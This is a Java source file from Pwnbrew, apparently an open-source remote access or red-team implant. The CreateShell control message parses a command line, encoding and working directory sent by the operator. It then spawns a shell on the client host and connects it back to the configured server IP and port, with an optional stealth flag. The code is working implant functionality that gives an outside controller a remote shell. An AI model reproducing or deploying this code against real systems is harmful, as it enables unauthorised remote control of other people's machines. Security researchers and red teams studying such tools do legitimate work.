/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


/*
* CreateShell.java
*
* Created on June 7, 2013, 8:55:42 PM
*/

package pwnbrew.network.control.messages;

import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import pwnbrew.ClientConfig;
import pwnbrew.manager.OutgoingConnectionManager;
import pwnbrew.manager.PortManager;
import pwnbrew.utilities.Constants;
import pwnbrew.network.ClientPortRouter;
import pwnbrew.network.ControlOption;
import pwnbrew.network.RegisterMessage;
import pwnbrew.network.shell.Shell;
import pwnbrew.network.shell.ShellConnectionCallback;
import pwnbrew.utilities.ReconnectTimer;

/**
 *
 *  
 */
public final class CreateShell extends ControlMessage {

    private String[] cmdString;
    private String encoding;
    private String currentDir;
    private String startupCmd;
    private boolean redirectStderr = false;
    
    private static final byte OPTION_CMD_STRING = 5;
    private static final byte OPTION_ENCODING = 20;
    public static final byte OPTION_STARTUP_CMD = 22;
    public static final byte OPTION_REDIRECT_STDERR = 24;
    private static final byte OPTION_CURRENT_DIR = 35;
        
    public static final short MESSAGE_ID = 0x33;
    
    //Class name
    private static final String NAME_Class = CreateShell.class.getSimpleName();
    
    // ==========================================================================
    /**
     * Constructor
     *
     * @param passedId
    */
    public CreateShell( byte[] passedId ) {
        super( passedId );
    }
    
    //=========================================================================
    /**
     *  Sets the variable in the message related to this TLV
     * 
     * @param tempTlv 
     * @return  
     */
    @Override
    public boolean setOption( ControlOption tempTlv ){        
       
        boolean retVal = true;
        try {
            
            byte[] theValue = tempTlv.getValue();
            switch( tempTlv.getType()){
                
                case OPTION_CMD_STRING:
                    
                    String currStr = new String( theValue, "US-ASCII");
                    List<String> cmdLineStringList = new ArrayList<>();

                    //Split the strings out of the null byte delimited string
                    while(currStr.length() > 0){
                        int nullByteIndex = currStr.indexOf((byte)0x00);
                        cmdLineStringList.add(currStr.substring(0, nullByteIndex));
                        currStr = currStr.substring(nullByteIndex + 1, currStr.length());                   
                    }

                    cmdString = (String[])(cmdLineStringList.toArray(new String[cmdLineStringList.size()]));
                    
                    break;
                case OPTION_ENCODING:
                    encoding = new String( theValue, "US-ASCII");
                    break;
                case OPTION_CURRENT_DIR:
                    currentDir = new String( theValue, "US-ASCII");
                    break;
                case OPTION_STARTUP_CMD:
                    startupCmd = new String( theValue, "US-ASCII");
                    break;
                case OPTION_REDIRECT_STDERR:
                    if( theValue.length > 0 ){
                        byte aByte = theValue[0];
                        if( aByte == 0x1)
                            redirectStderr = true;
                    }
                    break;
                default:
                    retVal = false;
                    break;
            }
            
        } catch (UnsupportedEncodingException ex) {
            ex = null;
        }
        return retVal;
    }
    
    //===============================================================
    /**
    *   Performs the logic specific to the message.
    *
     * @param passedManager
    */
    @Override
    public void evaluate( PortManager passedManager ) { 
        
        ClientConfig theConf = ClientConfig.getConfig();
        int socketPort = theConf.getSocketPort();
        String serverIp = theConf.getServerIp();
        
        //Get the port router
        ClientPortRouter aPR = (ClientPortRouter) passedManager.getPortRouter( socketPort );
        int theClientId = getSrcHostId();
        
        //Create the shell
        Shell aShell = new Shell( Constants.Executor, passedManager, 
                    theClientId, encoding, cmdString, startupCmd, currentDir,redirectStderr );
        
        
        //Create the Timer
        OutgoingConnectionManager theOCM = aPR.getConnectionManager();
        int channelId = theOCM.getNextChannelId();
        ReconnectTimer aReconnectTimer = new ReconnectTimer(passedManager, channelId); 
        byte stlth_val = 0;
        if( theConf.useStealth() )
            stlth_val = 1;   
        
        //Queue register message
        RegisterMessage aMsg = new RegisterMessage( RegisterMessage.REG, stlth_val, channelId);
        aReconnectTimer.setPostConnectMessage(aMsg);
        
        //Create the shell callback
        ShellConnectionCallback aSCC = new ShellConnectionCallback(serverIp, socketPort, passedManager, aShell, aReconnectTimer);
//        aPR.ensureConnectivity( aSCC );   
        aReconnectTimer.setConnectionCallback(aSCC);
        
        //Start the timer
        aReconnectTimer.start();
        
    }


}/* END CLASS CreateShell */
